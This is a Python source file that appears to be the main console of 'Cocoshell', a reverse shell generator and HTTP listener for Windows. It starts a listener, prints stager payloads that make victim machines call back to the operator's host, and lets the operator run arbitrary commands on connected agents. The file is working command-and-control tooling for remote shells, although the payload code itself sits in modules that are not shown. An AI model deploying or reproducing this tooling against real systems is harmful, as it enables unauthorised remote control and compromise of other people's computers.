import argparse, uuid, sys, subprocess, time
from core.log import Log
from core.functions import *
from core.payload import *

parser = argparse.ArgumentParser(
    prog='Cocoshell',
    description='A reverse shell generator for windows and listener that uses http to establish a connection.',
    epilog='''
    tbd
    '''
)
parser.add_argument("-lh", "--lhost", help="the ip the agent will connect to")
parser.add_argument("-lp", "--lport", help="the port the agent will connect to (default: 5000)")
parser.add_argument("-r", "--route", help="the api endpoint the agent will connect to")
parser.add_argument("-v", "--verbose", help="debug messages will be printed to the console", action="store_true")
args, leftovers = parser.parse_known_args()
logger = Log(args.verbose)
route = args.route if args.route is not None else str(uuid.uuid4())
if args.lhost is not None:
    lhost = args.lhost
else:
    logger.failed("please use -l/--lhost to specify the ip the agent will connect to")
    sys.exit(0)
lport = args.lport if args.lport is not None else '5000'
api_url = 'http://0.0.0.0:' + lport
request_url = 'http://' + lhost + ':' + lport
agent_url = request_url + '/' + route

logger.info(f"The agents will connect to {agent_url}")
proc = subprocess.Popen(["python3", "core/api.py", "-r", route, "-lp", lport, "-u", agent_url], stdout=None)
time.sleep(0.5)

try:
    while True:
        command = input(f"cocoshell> ").strip()
        if command == "agents":
            print_agents(request_url)
        elif command == "help":
            logger.print_general_help()
        elif command == "payload":
            logger.payload(generate_iwr(agent_url))
        elif command == "payload_full":
            logger.payload(generate_payload(agent_url))
        elif command == "exit":
            raise SystemExit
        elif "remove" in command:
            agent_uuid = command.split("remove")[1].strip()
            logger.debug(delete_agent(request_url, agent_uuid))
        elif "interact" in command:
            agent_uuid = command.split("interact")[1].strip()
            agent = interact(request_url, agent_uuid)
            if agent:
                while True:
                    command = input(f"cocoshell <{agent.hostname}> ").strip()
                    if command == "help":
                        logger.print_agent_help()
                    elif command == "back":
                        break
                    else:
                        logger.message(execute_command(request_url, agent_uuid, command))
except KeyboardInterrupt:
    logger.important("Ctrl+C detected")
    pass
except SystemExit:
    logger.debug("Exiting")
    pass
finally:
    proc.terminate()